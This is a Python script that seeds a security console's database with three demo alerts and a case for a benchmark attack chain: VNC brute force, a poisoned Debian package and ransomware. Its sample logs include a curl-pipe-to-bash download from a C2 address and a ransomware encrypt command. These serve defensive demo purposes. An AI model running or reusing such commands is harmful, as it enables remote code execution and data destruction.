"""Seed the CAM-LDS vnc_apt attack chain as alerts + a linked case.

Source corpus: CAM-LDS-team-messy (Scenario 3, vnc_apt). Each alert carries the
on-disk evidence paths in ``raw_event.evidence_files`` so an analyst can pivot
from the console straight to the log that produced it.

Run inside the api container:

    docker exec aisoc-api python -m app.scripts.seed_cam_lds

The log directory is a *host* path recorded as metadata — this script never
reads the corpus, so it works regardless of where the files are mounted.
"""

import argparse
import asyncio
import json
import uuid
from datetime import UTC, datetime

from sqlalchemy import delete, select, text

from app.api.v1.dev_auth import DEMO_TENANT_ID
from app.db.database import AsyncSessionLocal
from app.models.alert import Alert
from app.models.case import Case, CaseTimeline

DEFAULT_LOG_DIR = r"D:\Projects\sxsecurityinvestigator\data\logs\CAM-LDS-team-messy"

CASE_NUMBER = "INC-CAM-LDS-001"
SEED_TAG = "cam-lds"

# Stable UUIDs derived from the source alert_id so re-runs update in place.
_NS = uuid.UUID("6b1f5a1e-3c2d-4f7a-9b8e-1d0c5a2f7e34")


def _aid(alert_id: str) -> uuid.UUID:
    return uuid.uuid5(_NS, alert_id)


def _ts(value: str) -> datetime:
    return datetime.fromisoformat(value.replace("Z", "+00:00"))


# severity 1-5 (source) -> AiSOC's five-tier ladder
SEVERITY_MAP = {1: "info", 2: "low", 3: "medium", 4: "high", 5: "critical"}

# The console reads case detail from ``aisoc_cases``; the ORM ``cases`` table is
# a parallel store. Both are written so either read path resolves the case.
TECHNIQUE_NAMES = {
    "T1110": "Brute Force",
    "T1003": "OS Credential Dumping",
    "T1021": "Remote Services",
    "T1574": "Hijack Execution Flow",
    "T1072": "Software Deployment Tools",
    "T1059": "Command and Scripting Interpreter",
    "T1105": "Ingress Tool Transfer",
    "T1071": "Application Layer Protocol",
    "T1486": "Data Encrypted for Impact",
    "T1485": "Data Destruction",
    "T1490": "Inhibit System Recovery",
    "T1213": "Data from Information Repositories",
}

ALERTS = [
    {
        "alert_id": "cam_vnc_bruteforce_001",
        "title": "VNC brute force + /etc/shadow access on inetfw",
        "timestamp": "2025-12-12T17:20:15Z",
        "severity": 4,
        "host": "inetfw",
        "ip": "192.168.100.23",
        "user": "root",
        "category": "siem",
        "connector_type": "wazuh",
        "priority": 82,
        "ai_score": 0.88,
        "confidence": 84,
        "confidence_label": "high",
        "tactics": ["Credential Access", "Initial Access"],
        "techniques": ["T1110", "T1003", "T1021"],
        "description": (
            "Repeated VNC authentication failures on port 5901 followed by "
            "unauthorized /etc/shadow access. Stage 1 of the CAM-LDS vnc_apt chain."
        ),
        "raw_log": (
            "sshd[1902]: Failed password for root from 192.42.1.174 port 5901 ssh2; "
            "pam_unix(sshd:auth): check pass; user unknown"
        ),
        "ai_summary": (
            "Brute-force authentication against VNC/5901 on inetfw followed by shadow-file "
            "read. Establishes the initial foothold and harvests credentials reused in stage 2."
        ),
        "recommendations": [
            "Isolate inetfw (192.168.100.23) from the management VLAN",
            "Force credential rotation for root and any account in /etc/shadow",
            "Block inbound 5901 from untrusted sources at the perimeter",
        ],
        "evidence_files": [
            "security/inetfw__log_auth.log",
            "security/inetfw__log_audit_audit.log",
            "network/inetfw__log_suricata_eve.json",
            "security/wazuh__alerts_alerts.json",
        ],
    },
    {
        "alert_id": "cam_repo_poison_002",
        "title": "healthcheckd .deb package poisoning on reposerver",
        "timestamp": "2025-12-12T18:45:00Z",
        "severity": 5,
        "host": "reposerver",
        "ip": "192.168.100.15",
        "user": "puppet",
        "category": "endpoint",
        "connector_type": "auditd",
        "priority": 94,
        "ai_score": 0.95,
        "confidence": 92,
        "confidence_label": "high",
        "tactics": ["Persistence", "Lateral Movement"],
        "techniques": ["T1574", "T1072", "T1059"],
        "description": (
            "Unauthorized deb package modification and healthcheck_cron.sh tampering on the "
            "package repo server, using a stolen Puppet certificate. Stage 2 — supply-chain "
            "pivot that distributes the implant to every managed host."
        ),
        "raw_log": (
            "dpkg-deb -b /tmp/build/healthcheckd /var/packages/debian/healthcheckd.deb; "
            "modified by puppet user via stolen certificate"
        ),
        "ai_summary": (
            "Attacker rebuilt healthcheckd.deb on the repo server under the puppet identity. "
            "Any host pulling this package executes attacker code as root via healthcheck_cron.sh."
        ),
        "recommendations": [
            "Quarantine /var/packages/debian/healthcheckd.deb and rebuild from a trusted source",
            "Revoke the compromised Puppet certificate and re-issue the CA",
            "Audit every host that installed healthcheckd since 2025-12-12",
        ],
        "evidence_files": [
            "security/reposerver__log_audit_audit.log",
            "application/reposerver__log_puppetlabs_puppetserver_puppetserver.log",
            "application/reposerver__log_apache2_access.log",
            "system/linuxshare__log_dpkg.log",
        ],
    },
    {
        "alert_id": "cam_ransomware_003",
        "title": "donotcry ransomware execution on linuxshare",
        "timestamp": "2025-12-12T20:15:30Z",
        "severity": 5,
        "host": "linuxshare",
        "ip": "192.168.100.50",
        "user": "root",
        "category": "network",
        "connector_type": "suricata_ids",
        "priority": 98,
        "ai_score": 0.98,
        "confidence": 96,
        "confidence_label": "high",
        "tactics": ["Command and Control", "Impact"],
        "techniques": ["T1105", "T1071", "T1486", "T1485", "T1490"],
        "description": (
            "Ransomware execution detected: install.sh pulled from 192.42.1.174:8888 via the "
            "poisoned healthcheck cron, then donotcry encrypting /media/data. Stage 3 — impact."
        ),
        "raw_log": (
            "curl -s http://192.42.1.174:8888/install.sh | bash; "
            "./donotcry --encrypt /media/data/Images; mass file rename detected"
        ),
        "ai_summary": (
            "C2 ingress from 192.42.1.174:8888 landed via the stage-2 poisoned package, "
            "followed by donotcry encrypting /media/data/Images. Confirmed data-destruction impact."
        ),
        "recommendations": [
            "Isolate linuxshare (192.168.100.50) immediately and preserve volatile memory",
            "Block 192.42.1.174 egress at the firewall and hunt for other beacons",
            "Validate /media/data backup integrity before any restore attempt",
        ],
        "evidence_files": [
            "security/linuxshare__log_audit_audit.log",
            "system/linuxshare__log_cron.log",
            "security/linuxshare__log_healthcheckd.log",
            "network/inetfw__log_suricata_fast.log",
            "security/wazuh__alerts_2025_Dec_ossec-alerts-12.json",
        ],
    },
]


async def seed(log_dir: str) -> None:
    case_id = uuid.uuid5(_NS, CASE_NUMBER)
    alert_ids = [_aid(a["alert_id"]) for a in ALERTS]

    async with AsyncSessionLocal() as session:
        # Idempotent: drop any prior run before re-inserting.
        await session.execute(delete(CaseTimeline).where(CaseTimeline.case_id == case_id))
        await session.execute(delete(Alert).where(Alert.id.in_(alert_ids)))
        await session.execute(delete(Case).where(Case.id == case_id))
        await session.flush()

        for spec in ALERTS:
            event_time = _ts(spec["timestamp"])
            session.add(
                Alert(
                    id=_aid(spec["alert_id"]),
                    tenant_id=DEMO_TENANT_ID,
                    title=spec["title"],
                    description=spec["description"],
                    severity=SEVERITY_MAP[spec["severity"]],
                    status="new",
                    priority=spec["priority"],
                    category=spec["category"],
                    mitre_tactics=spec["tactics"],
                    mitre_techniques=spec["techniques"],
                    connector_type=spec["connector_type"],
                    ai_score=spec["ai_score"],
                    ai_summary=spec["ai_summary"],
                    ai_recommendations=spec["recommendations"],
                    confidence=spec["confidence"],
                    confidence_label=spec["confidence_label"],
                    affected_ips=[spec["ip"]],
                    affected_hosts=[spec["host"]],
                    affected_users=[spec["user"]],
                    case_id=case_id,
                    tags=[SEED_TAG, "vnc_apt", spec["host"], SEVERITY_MAP[spec["severity"]]],
                    raw_event={
                        "source_alert_id": spec["alert_id"],
                        "raw_log": spec["raw_log"],
                        "log_dir": log_dir,
                        "evidence_files": [f"{log_dir}\\{p.replace('/', chr(92))}" for p in spec["evidence_files"]],
                        "corpus": "CAM-LDS-team-messy",
                        "ground_truth": "benchmark_ground_truth.json",
                    },
                    event_time=event_time,
                    first_seen=event_time,
                    last_seen=event_time,
                    created_at=event_time,
                    updated_at=event_time,
                )
            )

        first = _ts(ALERTS[0]["timestamp"])
        last = _ts(ALERTS[-1]["timestamp"])
        session.add(
            Case(
                id=case_id,
                tenant_id=DEMO_TENANT_ID,
                case_number=CASE_NUMBER,
                title="CAM-LDS vnc_apt: VNC foothold → repo poisoning → donotcry ransomware",
                description=(
                    "Three-stage intrusion across inetfw, reposerver and linuxshare. Initial "
                    "access via VNC brute force and credential theft, lateral movement through a "
                    "poisoned healthcheckd Debian package distributed by the Puppet repo server, "
                    "and impact via the donotcry ransomware pulled from C2 192.42.1.174:8888.\n\n"
                    f"Evidence corpus: {log_dir}"
                ),
                status="open",
                priority="critical",
                severity="critical",
                case_type="security_incident",
                mitre_tactics=[
                    "Initial Access",
                    "Credential Access",
                    "Persistence",
                    "Lateral Movement",
                    "Command and Control",
                    "Impact",
                ],
                mitre_techniques=[
                    "T1110", "T1003", "T1021", "T1574",
                    "T1072", "T1059", "T1105", "T1071",
                    "T1486", "T1485", "T1490",
                ],
                alert_ids=[str(a) for a in alert_ids],
                tags=[SEED_TAG, "vnc_apt", "ransomware", "supply-chain"],
                summary=(
                    "Attack window 2025-12-12T17:20Z → 20:50Z. Chain: inetfw → reposerver → "
                    "linuxshare. Key artefacts: healthcheckd, healthcheck_cron.sh, install.sh, "
                    "donotcry, /etc/shadow, 192.42.1.174."
                ),
                created_at=first,
                updated_at=last,
            )
        )
        await session.flush()

        for spec in ALERTS:
            session.add(
                CaseTimeline(
                    case_id=case_id,
                    tenant_id=DEMO_TENANT_ID,
                    event_type="alert_linked",
                    content=f"{spec['title']} — {spec['host']} ({spec['ip']})",
                    event_metadata={
                        "source_alert_id": spec["alert_id"],
                        "evidence_files": spec["evidence_files"],
                    },
                    is_automated=True,
                    created_at=_ts(spec["timestamp"]),
                )
            )

        all_techniques = [
            "T1110", "T1003", "T1021", "T1574",
            "T1072", "T1059", "T1105", "T1071",
            "T1486", "T1485", "T1490",
        ]
        await session.execute(
            text("DELETE FROM aisoc_cases WHERE id = :id").bindparams(id=case_id)
        )
        await session.execute(
            text(
                """
                INSERT INTO aisoc_cases (
                    id, tenant_id, case_number, title, description, severity, status,
                    assignee, mitre_techniques, alert_ids, tags,
                    opened_at, created_at, updated_at, created_by
                ) VALUES (
                    :id, :tenant_id, :case_number, :title, :description, :severity, :status,
                    :assignee, CAST(:techs AS JSONB), CAST(:alert_ids AS uuid[]), CAST(:tags AS JSONB),
                    :opened_at, :created_at, :updated_at, :created_by
                )
                """
            ).bindparams(
                id=case_id,
                tenant_id=DEMO_TENANT_ID,
                case_number=CASE_NUMBER,
                title="CAM-LDS vnc_apt: VNC foothold → repo poisoning → donotcry ransomware",
                description=(
                    "Three-stage intrusion across inetfw, reposerver and linuxshare. Initial "
                    "access via VNC brute force and credential theft, lateral movement through a "
                    "poisoned healthcheckd Debian package distributed by the Puppet repo server, "
                    "and impact via the donotcry ransomware pulled from C2 192.42.1.174:8888. "
                    f"Evidence corpus: {log_dir}"
                ),
                severity="critical",
                status="investigating",
                assignee="",
                techs=json.dumps(
                    [{"id": t, "name": TECHNIQUE_NAMES.get(t, t)} for t in all_techniques]
                ),
                alert_ids="{" + ",".join(str(a) for a in alert_ids) + "}",
                tags=json.dumps([SEED_TAG, "vnc_apt", "ransomware", "supply-chain"]),
                opened_at=first,
                created_at=first,
                updated_at=last,
                created_by="seed_cam_lds",
            )
        )

        await session.commit()

    async with AsyncSessionLocal() as session:
        n = len((await session.execute(select(Alert).where(Alert.case_id == case_id))).scalars().all())

    print(f"[cam-lds] log dir : {log_dir}")
    print(f"[cam-lds] alerts  : {n}")
    print(f"[cam-lds] case    : {CASE_NUMBER}")
    print(f"[cam-lds] open    : http://localhost:3000/cases/{CASE_NUMBER}")


def main() -> None:
    parser = argparse.ArgumentParser(description="Seed the CAM-LDS vnc_apt chain.")
    parser.add_argument("--log-dir", default=DEFAULT_LOG_DIR)
    args = parser.parse_args()
    asyncio.run(seed(args.log_dir))


if __name__ == "__main__":
    main()
